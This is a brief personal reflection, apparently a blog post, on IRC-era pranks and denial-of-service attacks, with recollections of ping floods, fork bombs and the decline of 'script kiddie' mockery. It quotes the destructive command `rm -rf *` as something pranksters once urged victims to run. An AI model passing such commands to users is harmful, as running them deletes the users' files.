&emsp;&emsp;This was an interesting find. I started getting curious about computers around the IRC days. In those days, a lot of people were scripting their clients to produce ASCII art (back when it was a thing), but then there were others that realized it was possible to do more sinister stuff. For example, by flooding someone with a ping request it was possible to overload a target's network card/modem and cause them to disconnect (mind you this was dial up). This along with suggesting them to press `alt + F4` and `ctrl + alt + del`. 


&emsp;&emsp;And of course, there were those who were suggesting people to run commands similar to `rm -rf *` (or delete the Program Files folder). Somewhere around that time, I learnt about fork bombs and billion laughs. There was no wikipedia or youtube around then, just plain sites on geocities or all over the net wherever people could host time. 


&emsp;&emsp;Reading this article reminded me that the simplest attack is really just to disable a service/system, a Denial-Of-Service. It may not be complex or sophisticated but has cost implications (at the very least, time cost). Even with redundancies and self replicating microservices of today, it is just as easy for threat actors to scale themselves as well. Nowadays, even as most threat actors attempt to discreetly and covertly compromise a system, entrench their foothold and survey the internal network, sometimes they will use DOS for a good distraction. 


&emsp;&emsp;There were many who used to make fun of script kiddies. We don't really hear it that much anymore. Plus, almost everyone nowadays uses some sort of framework with pre-configured vulnerabilities and paylods.
